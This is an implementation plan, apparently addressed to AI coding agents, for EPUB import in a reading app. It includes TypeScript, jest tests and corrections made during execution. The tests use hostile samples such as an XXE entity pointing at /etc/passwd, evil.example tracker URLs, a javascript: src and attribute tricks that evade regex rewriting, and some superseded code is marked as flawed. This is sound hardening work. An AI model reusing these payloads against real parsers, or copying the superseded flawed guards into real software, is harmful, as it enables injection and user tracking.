# Open Shelves F1 — Imported Book Reading — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A book downloaded from Open Shelves appears in the Library and opens in the Mentible reader — rendering well, offline, on Android and web.

**Architecture:** Import unzips the EPUB with `fflate` (already a dependency), resolves `META-INF/container.xml` → OPF → spine by **reusing** `epubCover.ts`'s existing resolution, rewrites every chapter's references (zip images inlined as `data:` URIs, remote refs dropped) and stores the result. That work is all DOM-free, so it runs on Hermes. **Sanitization happens at the render boundary**, not at import: web via the existing `sanitizeFragment`, native via DOMPurify inlined into the WebView — the only place on native with a DOM.

**Tech Stack:** TypeScript · `fflate` (unzip, existing dep) · `fast-xml-parser` (OPF, existing dep on this branch, hardened) · DOMPurify (existing dep) · Expo/RN · jest.

**Spec:** `docs/superpowers/specs/2026-07-14-imported-book-reading-design.md` (revised 2026-07-16 — read its **Revision note** first; three of the original assumptions were false).

**Branch:** `feat/open-shelves` @ `70ae57f` — 0 behind main, 754 tests green, tsc clean, `npm install` done. **Stays localhost-only; do not merge to main.**

## Global Constraints

- **No new dependencies.** `fflate` already unzips EPUBs (`src/storage/epubCover.ts`); `fast-xml-parser` and `dompurify` are already deps. The original spec called for `jszip` — that was written without checking. **Do not add it.**
- **Do not write a second EPUB parser.** `epubCover.ts` already resolves `META-INF/container.xml` → OPF → manifest. Task 1 **factors that out and shares it**; the cover extractor and the reader must never disagree about a book's OPF.
- **Do not write a second sanitizer.** DOMPurify is the boundary. `src/reader/sanitize.ts` is **web-only** — its header says *"DOMPurify needs a DOM. Never import this from a non-`.web` module."* Hermes has no DOM.
- **Import is DOM-free.** It runs on Hermes. Reference-rewriting is string/tree work, not sanitization.
- **`alt` is never `""`.** Use `figureAltText` semantics — an empty alt means "decorative" and hides content from screen readers (#324).
- **Exact caps (new, this feature):** `MAX_EPUB_BYTES = 50 * 1024 * 1024` · `MAX_ZIP_ENTRIES = 5000` · `MAX_INFLATED_BYTES = 200 * 1024 * 1024` · `MAX_CHAPTERS = 2000` · `MAX_IMAGE_BYTES = 10 * 1024 * 1024` (per image, matching media slice 1).
- **XML parsing is hostile-input hardened.** Reuse the exact `XMLParser` options from `src/openshelves/opds12.ts`: `processEntities: false` (the XXE guarantee — never expand entities), `parseTagValue: false`, `ignoreAttributes: false`, `attributeNamePrefix: "@_"`.
- **No network in CI**, ever (repo rule). Tests spy on `fetch` and assert it is **never called**.
- **Definition of Done:** add the feature key to `FEATURES` in `mobile/src/help-content/features.ts` **and** a Help topic with that `featureKey` in `mobile/src/help-content/topics.ts`, in the same PR. `mobile/__tests__/help/coverage.test.ts` fails otherwise.
- **Two readers, one renderer.** `src/reader/topicHtml.ts` is THE renderer (Hermes-safe); `renderContent.ts` is the thin web wrapper that sanitizes; `contentHtml.ts` builds the WebView document. **Do not reintroduce a second implementation** (#326 deleted one).

---

## File Structure

| File | Responsibility |
|---|---|
| `mobile/src/storage/epubZip.ts` | **New.** The shared EPUB container primitive: unzip + case-insensitive lookup + `container.xml` → OPF → `opfDir`. Factored **out of** `epubCover.ts`. Pure, Hermes-safe. |
| `mobile/src/storage/epubCover.ts` | **Modify.** Consumes `epubZip.ts` instead of doing its own resolution. Behaviour unchanged. |
| `mobile/src/openshelves/epubReader.ts` | **New.** Format only: `readEpub(bytes) → ParsedEpub` (metadata + spine + per-chapter images). Knows nothing about Mentible. Refuses DRM. Enforces caps. |
| `mobile/src/openshelves/epubChapterHtml.ts` | **New.** Pure reference-rewrite: inline zip images as `data:` URIs, drop remote refs. DOM-free. |
| `mobile/src/openshelves/epubToBook.ts` | **New.** Pure mapping: `ParsedEpub` → `{ book, chapters }`. Spine → `StructuredTOC`. No I/O. |
| `mobile/src/openshelves/importEpub.ts` | **New.** Orchestration: read → rewrite → map → persist. Atomic: a failure persists nothing. |
| `mobile/src/types/book.ts` | **Modify.** Add `ImportedChapter` + `Book.chapters?`. **Separate from `content`** — a `GeneratedTopic` means LLM-generated, schema-validated material; an imported chapter is neither. |
| `mobile/src/reader/topicHtml.ts` | **Modify.** Render an `ImportedChapter`'s HTML instead of the markdown pipeline. |
| `mobile/src/components/contentHtml.ts` | **Modify.** Inline DOMPurify; sanitize before `innerHTML` (D-I4/D-I6). |
| `mobile/app/shelves/downloads.tsx` | **Modify.** Add **Open** (native). |
| `mobile/app/(tabs)/shelves.tsx` | **Modify.** Add **Import an EPUB** (web file picker). |
| `mobile/assets/test-epubs/` | **New.** Hand-built fixtures — real EPUBs, not mocks. |

---

## Task 1: `epubZip.ts` — the shared container primitive

> **Corrected during execution (2026-07-16).** Task 1's review found two Important defects **in this
> task's own example code**, both since fixed:
>
> 1. **The refactor was not behaviour-neutral, and Step 6 wrongly claimed it was.** The old
>    `extractEpubCover` was *permissive* — a missing `container.xml` fell through to a filename
>    fallback and still yielded a cover; there was no DRM check and no cap. Routing it through the
>    strict `openEpub` turned all of those into `null`, silently dropping covers for books already in
>    users' libraries. Every existing cover test has a valid container and no encryption, so
>    "pre-existing tests still green" proved only that the happy paths were untouched. The shape is
>    now: `unzipEpub` (unzip + caps) → `resolveOpf` (**lenient**, returns null) → `openEpub`
>    (**strict**: throws + DRM, for the reader) — with `extractEpubCover` on the lenient path,
>    fallback intact.
> 2. **`MAX_INFLATED_BYTES` did not bound a zip bomb.** `unzipSync` inflates everything *before* the
>    byte-sum loop, so a real bomb exhausts memory inside `unzipSync` and the cap never fires — while
>    the comment claimed "caps bound a zip bomb before it lands". Now enforced inside fflate's
>    `filter`, which sees `originalSize` pre-inflation (verified), and the comment says what the code
>    does.
>
> Both are the same failure this project keeps hitting: **a guard named for something it doesn't
> check**. Neither was the implementer's doing — the code was verbatim from the text below.

**Files:**
- Create: `mobile/src/storage/epubZip.ts`
- Modify: `mobile/src/storage/epubCover.ts`
- Test: `mobile/__tests__/storage/epubZip.test.ts`

**Interfaces:**
- Consumes: `fflate`'s `unzipSync`, `strFromU8`.
- Produces:
  ```ts
  export interface EpubZip {
    files: Record<string, Uint8Array>;
    find: (path: string) => string | undefined;  // case-insensitive key lookup
    opf: string;        // the OPF document's text
    opfPath: string;    // e.g. "OEBPS/content.opf"
    opfDir: string;     // e.g. "OEBPS/" ("" when the OPF is at the root)
  }
  export class EpubError extends Error {}
  export function openEpub(bytes: Uint8Array): EpubZip;  // throws EpubError
  export const MAX_ZIP_ENTRIES = 5000;
  export const MAX_INFLATED_BYTES = 200 * 1024 * 1024;
  ```

- [ ] **Step 1: Write the failing test**

```ts
// mobile/__tests__/storage/epubZip.test.ts
import { zipSync, strToU8 } from "fflate";
import { openEpub, EpubError, MAX_ZIP_ENTRIES } from "@/storage/epubZip";

const CONTAINER = `<?xml version="1.0"?><container><rootfiles>
  <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
</rootfiles></container>`;

function epub(over: Record<string, Uint8Array> = {}): Uint8Array {
  return zipSync({
    "META-INF/container.xml": strToU8(CONTAINER),
    "OEBPS/content.opf": strToU8('<package><metadata><dc:title>T</dc:title></metadata></package>'),
    ...over,
  });
}

describe("openEpub", () => {
  it("resolves container.xml → OPF and reports the OPF's directory", () => {
    const z = openEpub(epub());
    expect(z.opfPath).toBe("OEBPS/content.opf");
    expect(z.opfDir).toBe("OEBPS/");
    expect(z.opf).toContain("<dc:title>T</dc:title>");
  });

  it("reports an empty opfDir when the OPF sits at the zip root", () => {
    const z = openEpub(zipSync({
      "META-INF/container.xml": strToU8(CONTAINER.replace("OEBPS/content.opf", "content.opf")),
      "content.opf": strToU8("<package/>"),
    }));
    expect(z.opfDir).toBe("");
  });

  it("finds entries case-insensitively (real EPUBs disagree about case)", () => {
    const z = openEpub(epub());
    expect(z.find("meta-inf/CONTAINER.xml")).toBe("META-INF/container.xml");
  });

  it("refuses a DRM/encrypted book with a clear error rather than rendering garbage", () => {
    const bytes = epub({ "META-INF/encryption.xml": strToU8("<encryption/>") });
    expect(() => openEpub(bytes)).toThrow(EpubError);
    expect(() => openEpub(bytes)).toThrow(/protected|DRM/i);
  });

  it("refuses a zip with too many entries (zip bomb)", () => {
    const many: Record<string, Uint8Array> = {};
    for (let i = 0; i <= MAX_ZIP_ENTRIES; i++) many[`f${i}.txt`] = strToU8("x");
    expect(() => openEpub(zipSync(many))).toThrow(/too many/i);
  });

  it("refuses a file that is not a zip at all", () => {
    expect(() => openEpub(strToU8("this is not a zip"))).toThrow(EpubError);
  });

  it("refuses an EPUB with no container.xml", () => {
    expect(() => openEpub(zipSync({ "random.txt": strToU8("x") }))).toThrow(/container\.xml/i);
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/storage/epubZip.test.ts`
Expected: FAIL — `Cannot find module '@/storage/epubZip'`

- [ ] **Step 3: Implement `epubZip.ts`**

```ts
// mobile/src/storage/epubZip.ts
import { strFromU8, unzipSync } from "fflate";

// The EPUB container primitive, shared by the cover extractor and the reader.
//
// This logic used to live inside `extractEpubCover`. It is factored out rather
// than duplicated so the two can never disagree about what a book's OPF says —
// the same rule the reader applies to sanitizers and renderers.
//
// Pure and DOM-free: runs on Hermes and on web.

export class EpubError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "EpubError";
  }
}

/** An EPUB is hostile input (ADR-028). Caps bound a zip bomb before it lands. */
export const MAX_ZIP_ENTRIES = 5000;
export const MAX_INFLATED_BYTES = 200 * 1024 * 1024;

export interface EpubZip {
  files: Record<string, Uint8Array>;
  find: (path: string) => string | undefined;
  opf: string;
  opfPath: string;
  opfDir: string;
}

export function openEpub(bytes: Uint8Array): EpubZip {
  let files: Record<string, Uint8Array>;
  try {
    files = unzipSync(bytes);
  } catch {
    throw new EpubError("This file isn't a readable EPUB.");
  }

  const keys = Object.keys(files);
  if (keys.length > MAX_ZIP_ENTRIES) {
    throw new EpubError(`This EPUB has too many files (over ${MAX_ZIP_ENTRIES}).`);
  }
  let inflated = 0;
  for (const k of keys) {
    inflated += files[k].byteLength;
    if (inflated > MAX_INFLATED_BYTES) throw new EpubError("This EPUB is too large to open.");
  }

  const find = (path: string) => keys.find((k) => k.toLowerCase() === path.toLowerCase());

  // Refuse DRM rather than rendering garbage (spec: "detected and refused with a
  // clear message").
  if (find("META-INF/encryption.xml")) {
    throw new EpubError("This book is copy-protected (DRM), so it can't be opened here.");
  }

  const containerKey = find("META-INF/container.xml");
  if (!containerKey) throw new EpubError("This EPUB is missing META-INF/container.xml.");
  const opfPath = /full-path="([^"]+)"/.exec(strFromU8(files[containerKey]))?.[1];
  if (!opfPath) throw new EpubError("This EPUB's container.xml names no package file.");
  const opfKey = find(opfPath);
  if (!opfKey) throw new EpubError("This EPUB's package file is missing.");

  return {
    files,
    find,
    opf: strFromU8(files[opfKey]),
    opfPath,
    opfDir: opfPath.includes("/") ? opfPath.slice(0, opfPath.lastIndexOf("/") + 1) : "",
  };
}
```

- [ ] **Step 4: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/storage/epubZip.test.ts`
Expected: PASS — 7 tests.

- [ ] **Step 5: Make `epubCover.ts` consume it (no behaviour change)**

Replace the top of `extractEpubCover` so it uses the shared primitive. Keep the cover-specific logic exactly as-is.

```ts
// mobile/src/storage/epubCover.ts — replace the unzip + container/OPF block
import { strFromU8 } from "fflate";
import { openEpub, type EpubZip } from "@/storage/epubZip";

export function extractEpubCover(bytes: ArrayBuffer): EpubCover | null {
  let z: EpubZip;
  try {
    z = openEpub(new Uint8Array(bytes));
  } catch {
    return null; // cover extraction is best-effort; callers expect null, not a throw
  }
  const { files, find, opf, opfDir } = z;
  const keys = Object.keys(files);

  let coverHref: string | undefined;
  let coverMime: string | undefined;

  let item = /<item\b[^>]*\bproperties="[^"]*\bcover-image\b[^"]*"[^>]*>/.exec(opf)?.[0];
  if (!item) {
    const coverId = /<meta\b[^>]*\bname="cover"[^>]*\bcontent="([^"]+)"/.exec(opf)?.[1];
    if (coverId) {
      item = new RegExp(`<item\\b[^>]*\\bid="${escapeReg(coverId)}"[^>]*>`).exec(opf)?.[0];
    }
  }
  if (item) {
    const href = /\bhref="([^"]+)"/.exec(item)?.[1];
    coverMime = /\bmedia-type="([^"]+)"/.exec(item)?.[1];
    if (href) coverHref = opfDir + href;
  }
  // ...the rest of the existing function is unchanged (cover key resolution + return).
}
```

- [ ] **Step 6: Prove the refactor changed nothing**

Run: `cd mobile && npx jest __tests__/storage/epubCover.test.ts __tests__/storage/epubZip.test.ts`
Expected: PASS — every pre-existing cover test still green.

- [ ] **Step 7: Commit**

```bash
git add mobile/src/storage/epubZip.ts mobile/src/storage/epubCover.ts mobile/__tests__/storage/epubZip.test.ts
git commit -m "feat(open-shelves): shared EPUB container primitive (openEpub), reused by the cover extractor

Factored out of extractEpubCover rather than duplicated: the cover extractor and
the reader must never disagree about a book's OPF. Adds DRM refusal and zip-bomb
caps. No new dependency — fflate already unzips EPUBs; the spec's call for jszip
was written without checking."
```

---

## Task 2: `epubReader.ts` — parse the spine

> **Corrected during execution (2026-07-16).** This task's XXE test below is **wrong** and was
> replaced. It calls `readEpub(...)` expecting **no throw**, but `fast-xml-parser` throws
> `"External entities are not supported"` on an internal-subset `<!ENTITY … SYSTEM …>` regardless of
> `processEntities: false`. That test forced an implementer to add a `stripDoctype()` regex, which
> review then proved **defeatable** (a quoted `]>` inside an entity value truncates the match,
> yielding a *silent malformed parse* rather than the throw its comment claimed).
>
> The mechanism is deleted rather than hardened — hand-scanning XML with a regex is the trap that
> produced the finding. The parser's own refusal **is** the wanted behaviour: a hostile package fails
> loudly at import, which is exactly the spec's posture. Verified against the installed library: a
> benign `<!DOCTYPE package PUBLIC …>` (no internal subset) parses fine unstripped, and
> `fast-xml-parser` has **no file/network I/O** — a SYSTEM identifier is only a string in a
> validation check, so there was never a real exfiltration path to defend.
>
> The replacement tests assert the refusal, prove a benign DOCTYPE still parses, and — unlike the
> original — **discriminate on `processEntities`** (the old test passed even with it flipped to
> `true`, guarding nothing).

**Files:**
- Create: `mobile/src/openshelves/epubReader.ts`
- Test: `mobile/__tests__/openshelves/epubReader.test.ts`

**Interfaces:**
- Consumes: `openEpub`, `EpubError`, `MAX_ZIP_ENTRIES` from `@/storage/epubZip` (Task 1).
- Produces:
  ```ts
  export interface SpineItem { id: string; title: string; html: string; images: Record<string, Uint8Array> }
  export interface ParsedEpub {
    metadata: { title: string; authors: string[]; language?: string };
    spine: SpineItem[];
  }
  export const MAX_CHAPTERS = 2000;
  export function readEpub(bytes: Uint8Array): ParsedEpub;  // throws EpubError
  ```

- [ ] **Step 1: Write the failing test**

```ts
// mobile/__tests__/openshelves/epubReader.test.ts
import { zipSync, strToU8 } from "fflate";
import { readEpub } from "@/openshelves/epubReader";
import { EpubError } from "@/storage/epubZip";

const CONTAINER = `<?xml version="1.0"?><container><rootfiles>
  <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
</rootfiles></container>`;

function opf(body: string): string {
  return `<?xml version="1.0"?>
<package xmlns:dc="http://purl.org/dc/elements/1.1/">
  <metadata>
    <dc:title>Frankenstein</dc:title>
    <dc:creator>Mary Shelley</dc:creator>
    <dc:language>en</dc:language>
  </metadata>
  ${body}
</package>`;
}

function book(extra: Record<string, Uint8Array> = {}, body?: string): Uint8Array {
  return zipSync({
    "META-INF/container.xml": strToU8(CONTAINER),
    "OEBPS/content.opf": strToU8(opf(body ?? `
      <manifest>
        <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
        <item id="c2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
      </manifest>
      <spine><itemref idref="c1"/><itemref idref="c2"/></spine>`)),
    "OEBPS/ch1.xhtml": strToU8("<html><body><h1>Letter 1</h1><p>To Mrs Saville.</p></body></html>"),
    "OEBPS/ch2.xhtml": strToU8("<html><body><h1>Letter 2</h1><p>How slowly the time passes.</p></body></html>"),
    ...extra,
  });
}

describe("readEpub", () => {
  it("reads the book's metadata", () => {
    const p = readEpub(book());
    expect(p.metadata.title).toBe("Frankenstein");
    expect(p.metadata.authors).toEqual(["Mary Shelley"]);
    expect(p.metadata.language).toBe("en");
  });

  it("returns chapters in SPINE order, not manifest or zip order", () => {
    const p = readEpub(book({}, `
      <manifest>
        <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
        <item id="c2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
      </manifest>
      <spine><itemref idref="c2"/><itemref idref="c1"/></spine>`));
    expect(p.spine.map((s) => s.id)).toEqual(["c2", "c1"]);
    expect(p.spine[0].html).toContain("Letter 2");
  });

  it("titles each chapter from its first heading, falling back to a positional label", () => {
    const p = readEpub(book());
    expect(p.spine[0].title).toBe("Letter 1");
    const untitled = readEpub(book({ "OEBPS/ch1.xhtml": strToU8("<html><body><p>no heading</p></body></html>") }));
    expect(untitled.spine[0].title).toBe("Chapter 1");
  });

  it("collects each chapter's referenced images from inside the zip", () => {
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47]);
    const p = readEpub(book({
      "OEBPS/ch1.xhtml": strToU8('<html><body><img src="images/plate.png"/></body></html>'),
      "OEBPS/images/plate.png": png,
    }));
    expect(Object.keys(p.spine[0].images)).toEqual(["images/plate.png"]);
    expect(p.spine[0].images["images/plate.png"]).toEqual(png);
  });

  it("does NOT collect remote images — they must never be fetched", () => {
    const p = readEpub(book({
      "OEBPS/ch1.xhtml": strToU8('<html><body><img src="https://evil.example/track.png"/></body></html>'),
    }));
    expect(Object.keys(p.spine[0].images)).toEqual([]);
  });

  it("keeps a chapter whose body is empty rather than dropping it (TOC must match the book)", () => {
    const p = readEpub(book({ "OEBPS/ch1.xhtml": strToU8("<html><body></body></html>") }));
    expect(p.spine).toHaveLength(2);
  });

  it("does not expand XML entities (XXE)", () => {
    const xxe = `<?xml version="1.0"?><!DOCTYPE p [<!ENTITY x SYSTEM "file:///etc/passwd">]>` + opf(`
      <manifest><item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>
      <spine><itemref idref="c1"/></spine>`);
    const p = readEpub(zipSync({
      "META-INF/container.xml": strToU8(CONTAINER),
      "OEBPS/content.opf": strToU8(xxe),
      "OEBPS/ch1.xhtml": strToU8("<html><body><p>hi</p></body></html>"),
    }));
    expect(JSON.stringify(p)).not.toContain("root:");
  });

  it("refuses a book with no spine", () => {
    expect(() => readEpub(book({}, "<manifest/><spine/>"))).toThrow(EpubError);
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/openshelves/epubReader.test.ts`
Expected: FAIL — `Cannot find module '@/openshelves/epubReader'`

- [ ] **Step 3: Implement `epubReader.ts`**

```ts
// mobile/src/openshelves/epubReader.ts
import { strFromU8 } from "fflate";
import { XMLParser } from "fast-xml-parser";
import { openEpub, EpubError, type EpubZip } from "@/storage/epubZip";

// EPUB format code. Knows NOTHING about Mentible — it returns the book's own
// structure, and `epubToBook.ts` maps that onto our types.
//
// An EPUB from an arbitrary catalog is hostile input, exactly like feed XML
// (ADR-028). These parser options are the SAME hardening `opds12.ts` uses:
// processEntities:false is the XXE guarantee (entities are never expanded), and
// parseTagValue:false stops "01" or "1e5" being coerced to numbers.
const parser = new XMLParser({
  ignoreAttributes: false,
  attributeNamePrefix: "@_",
  processEntities: false,
  parseTagValue: false,
});

export const MAX_CHAPTERS = 2000;

export interface SpineItem {
  id: string;
  title: string;
  html: string;
  /** Zip-relative path → bytes, for images this chapter references. */
  images: Record<string, Uint8Array>;
}

export interface ParsedEpub {
  metadata: { title: string; authors: string[]; language?: string };
  spine: SpineItem[];
}

function asArray<T>(v: T | T[] | undefined): T[] {
  return v === undefined ? [] : Array.isArray(v) ? v : [v];
}

function text(v: unknown): string {
  if (typeof v === "string") return v;
  if (v && typeof v === "object" && "#text" in (v as Record<string, unknown>)) {
    return String((v as Record<string, unknown>)["#text"] ?? "");
  }
  return "";
}

/** Resolve an href relative to the OPF's directory, collapsing `..` segments. */
function resolve(opfDir: string, href: string): string {
  const parts = (opfDir + href).split("/");
  const out: string[] = [];
  for (const p of parts) {
    if (p === "." || p === "") continue;
    if (p === "..") out.pop();
    else out.push(p);
  }
  return out.join("/");
}

export function readEpub(bytes: Uint8Array): ParsedEpub {
  const z: EpubZip = openEpub(bytes);
  const pkg = parser.parse(z.opf)?.package ?? {};
  const meta = pkg.metadata ?? {};

  const metadata = {
    title: text(meta["dc:title"] ?? meta.title) || "Untitled",
    authors: asArray(meta["dc:creator"] ?? meta.creator).map(text).filter(Boolean),
    language: text(meta["dc:language"] ?? meta.language) || undefined,
  };

  // manifest id → href
  const hrefById = new Map<string, string>();
  for (const item of asArray<Record<string, string>>(pkg.manifest?.item)) {
    const id = item["@_id"];
    const href = item["@_href"];
    if (id && href) hrefById.set(id, href);
  }

  const refs = asArray<Record<string, string>>(pkg.spine?.itemref).slice(0, MAX_CHAPTERS);
  if (refs.length === 0) throw new EpubError("This EPUB has no readable chapters.");

  const spine: SpineItem[] = [];
  refs.forEach((ref, i) => {
    const id = ref["@_idref"];
    const href = id ? hrefById.get(id) : undefined;
    if (!href) return;
    const key = z.find(resolve(z.opfDir, href));
    if (!key) return;
    const html = strFromU8(z.files[key]);

    // Title from the chapter's first heading; a positional label otherwise. Never
    // empty — the TOC is how a reader navigates.
    const heading = /<h[1-6][^>]*>([\s\S]*?)<\/h[1-6]>/i.exec(html)?.[1] ?? "";
    const title = heading.replace(/<[^>]*>/g, "").trim() || `Chapter ${i + 1}`;

    // Collect ONLY images that live inside the zip. A remote src is ignored here
    // and dropped at rewrite time (Task 3) — never fetched, or opening a book
    // would leak the reader's IP and reading activity to whoever made it.
    const chapterDir = href.includes("/") ? href.slice(0, href.lastIndexOf("/") + 1) : "";
    const images: Record<string, Uint8Array> = {};
    for (const m of html.matchAll(/<img\b[^>]*\bsrc="([^"]+)"/gi)) {
      const src = m[1];
      if (/^[a-z][a-z0-9+.-]*:/i.test(src) || src.startsWith("//")) continue; // absolute/protocol-relative → remote
      const imgKey = z.find(resolve(z.opfDir, chapterDir + src));
      if (imgKey) images[src] = z.files[imgKey];
    }

    spine.push({ id: id!, title, html, images });
  });

  if (spine.length === 0) throw new EpubError("This EPUB has no readable chapters.");
  return { metadata, spine };
}
```

- [ ] **Step 4: Run it and watch it pass**

Run: `cd mobile && npx jest __tests__/openshelves/epubReader.test.ts`
Expected: PASS — 9 tests.

- [ ] **Step 5: Commit**

```bash
git add mobile/src/openshelves/epubReader.ts mobile/__tests__/openshelves/epubReader.test.ts
git commit -m "feat(open-shelves): epubReader — spine, metadata, in-zip images

Reuses openEpub (Task 1) and the SAME hardened XMLParser options as opds12.ts:
processEntities:false is the XXE guarantee. Remote <img src> is never collected
and never fetched — opening a book must not leak the reader's IP."
```

---

## Task 3: `epubChapterHtml.ts` — the reference rewrite (DOM-free)

> ## ⛔ REDESIGNED DURING EXECUTION (2026-07-16) — do not implement the task text below.
>
> **Five regex failures on this one function.** Three independent reviews, each running the real
> logic, each found a Critical the round before had missed:
>
> | Vector | Result |
> |---|---|
> | `<img data-src="ok.png" src="https://evil…">` | decoy inlined, remote URL survived |
> | `<img src="ok.png" src="https://evil…">` | non-global `replace` — duplicate rode through |
> | `<img src="ok.png" srcset="https://evil… 2x">` | `srcset` invisible to the counter *and* the rewriter |
> | `<img alt="x>" src="https://evil…">` | `[^>]*` is **quote-blind** — truncates the tag, defeats the `src` accounting itself, **and corrupts the visible text** |
> | `<picture><source>`, SVG `<image href>`, `<object data>`, `<iframe src>`, `<video poster>`, `<meta http-equiv=refresh>`, `style="background:url(…)"` | never touched at all |
>
> Each patch looked sufficient and each lost. The conclusion is not "write a better regex" — it is
> that **HTML rewriting does not belong at import**, because import runs on Hermes where there is no
> DOM to parse with.
>
> ### The replacement shape — mirror media slice 1's refs-in-schema pattern
>
> **Import stops touching HTML entirely.** It stores the chapter's HTML **raw**, plus the zip's images
> as a **keyed map** (`zip path → data: URI`) — exactly the refs pattern this codebase already ships
> for topic figures. **The render boundary owns everything**, with a real DOM:
>
> - **native**: DOMPurify inlined in the WebView (Task 6) — walks the parsed tree, swaps each `<img>`'s
>   `src` for its `data:` URI from the map, and drops every remaining non-`data:` reference
>   (`src`, `srcset`, `href`, `poster`, `data`, `style` url()) via an `afterSanitizeAttributes` hook.
> - **web**: the same hook on `sanitizeFragment`.
>
> A real parser sees `data-src` and `src` as distinct attributes, collapses duplicates, is not fooled
> by a `>` inside a quoted value, and reaches `srcset`/`<source>`/`<object>` alike. **One mechanism,
> one place, all five vector classes dead at once — and no regex ever touches a tag.**
>
> ### What each task becomes
>
> - **Task 3** — `rewriteChapterHtml` is **deleted**. In its place, a tiny pure function converting the
>   zip's image bytes to a `path → data: URI` map (caps + mime allowlist retained; no HTML parsing).
> - **Task 4** — `ImportedChapter` gains `images?: Record<string, string>` (path → `data:` URI)
>   alongside its raw `html`.
> - **Task 6** — owns the DOM walk + the drop-non-`data:` hook, on **both** surfaces. This is now the
>   *only* place the no-network guarantee exists, and it must be tested with every vector in the table
>   above, on both surfaces.
>
> Commits `abf03e3`, `31be325`, `25e5c79` implemented the superseded shape; the reference-rewriting
> parts are removed by the redesign. The zip-image collection in Task 2's `epubReader` is unaffected
> and still feeds the map.
>
> ---
>
> **Superseded detail from the first correction, kept for the record:**
>
> **Corrected during execution (2026-07-16) — a CRITICAL defect in this task's own code below.**
> Review demonstrated end-to-end that a remote reference **survives** the rewrite:
> `<img data-src="cover.png" src="https://evil.example/track.png">` → the decoy is inlined and the
> real remote URL is left untouched, because `\bsrc="` matches **inside** `data-src="` (`-` is a word
> boundary) and the leftmost match wins. The module whose stated purpose is "opening a book makes no
> network request" did not deliver it. The `fetch`-spy test cannot see this: the leak is a surviving
> *reference*, not a fetch call.
>
> Also demonstrated: `<script src="a.js"/>` followed by a real `<script>…</script>` makes the strip
> regexes span between them and **delete the paragraphs in between**; single-quoted `src='…'` drops
> illustrations silently; pre-inlined `data:` URIs are dropped though they need no zip lookup.
>
> **This is the third regex failure in this plan** (after `stripDoctype` in Task 2). The conclusion is
> architectural, not cosmetic: **a regex cannot be this guarantee.** Task 3's contract is restated as
> **best-effort inlining**, its demonstrated bugs are fixed, and the real enforcement moves to the
> render boundary where a DOM exists — see Task 6's amendment. Import remains DOM-free because Hermes
> has no DOM; that constraint is real, which is exactly why import cannot be the enforcement point.

**Files:**
- Create: `mobile/src/openshelves/epubChapterHtml.ts`
- Test: `mobile/__tests__/openshelves/epubChapterHtml.test.ts`

**Interfaces:**
- Consumes: `SpineItem` from `@/openshelves/epubReader` (Task 2).
- Produces:
  ```ts
  export const MAX_IMAGE_BYTES = 10 * 1024 * 1024;
  export function rewriteChapterHtml(item: SpineItem): string;
  ```

**Why this exists (read before implementing):** the original spec said *"sanitize at import; store sanitized"*. That is **not implementable on Android** — `sanitize.ts` is web-only and Hermes has no DOM. So import does the DOM-free half only: inline the zip's own images, drop every remote reference. **This is not sanitization** and must not be described as such; DOMPurify still runs at the render boundary (Task 6).

- [ ] **Step 1: Write the failing test**

```ts
// mobile/__tests__/openshelves/epubChapterHtml.test.ts
import { rewriteChapterHtml } from "@/openshelves/epubChapterHtml";
import type { SpineItem } from "@/openshelves/epubReader";

const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d]);
function item(html: string, images: Record<string, Uint8Array> = {}): SpineItem {
  return { id: "c1", title: "T", html, images };
}

describe("rewriteChapterHtml", () => {
  it("inlines an in-zip image as a data: URI", () => {
    const out = rewriteChapterHtml(item('<p><img src="images/plate.png" alt="A plate"/></p>', { "images/plate.png": png }));
    expect(out).toContain('src="data:image/png;base64,');
    expect(out).not.toContain("images/plate.png");
    expect(out).toContain('alt="A plate"');
  });

  it("DROPS a remote image rather than fetching it (no phone-home on open)", () => {
    const out = rewriteChapterHtml(item('<p><img src="https://evil.example/track.png"/></p>'));
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("<img");
  });

  it("drops protocol-relative and non-http schemes too", () => {
    expect(rewriteChapterHtml(item('<img src="//evil.example/x.png"/>'))).not.toContain("evil.example");
    expect(rewriteChapterHtml(item('<img src="javascript:alert(1)"/>'))).not.toContain("javascript:");
  });

  it("drops an in-zip image that exceeds the per-image cap", () => {
    const huge = new Uint8Array(10 * 1024 * 1024 + 1);
    const out = rewriteChapterHtml(item('<img src="big.png"/>', { "big.png": huge }));
    expect(out).not.toContain("<img");
  });

  it("drops <link rel=stylesheet> and remote <script> references (EPUB CSS is dropped — D-I3)", () => {
    const out = rewriteChapterHtml(item('<link rel="stylesheet" href="style.css"/><script src="https://x/y.js"></script><p>Body</p>'));
    expect(out).not.toContain("stylesheet");
    expect(out).not.toContain("y.js");
    expect(out).toContain("<p>Body</p>");
  });

  it("returns the body only — not <html>/<head> wrappers", () => {
    const out = rewriteChapterHtml(item("<html><head><title>x</title></head><body><p>Real</p></body></html>"));
    expect(out).toContain("<p>Real</p>");
    expect(out).not.toContain("<head>");
    expect(out).not.toContain("<title>");
  });

  it("is total: an empty chapter yields an empty string, not a throw", () => {
    expect(rewriteChapterHtml(item(""))).toBe("");
    expect(rewriteChapterHtml(item("<html><body></body></html>"))).toBe("");
  });

  it("picks the right mime from the file's extension", () => {
    const out = rewriteChapterHtml(item('<img src="p.jpg"/>', { "p.jpg": png }));
    expect(out).toContain("data:image/jpeg;base64,");
  });
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `cd mobile && npx jest __tests__/openshelves/epubChapterHtml.test.ts`
Expected: FAIL — `Cannot find module '@/openshelves/epubChapterHtml'`

- [ ] **Step 3: Implement `epubChapterHtml.ts`**

```ts
// mobile/src/openshelves/epubChapterHtml.ts
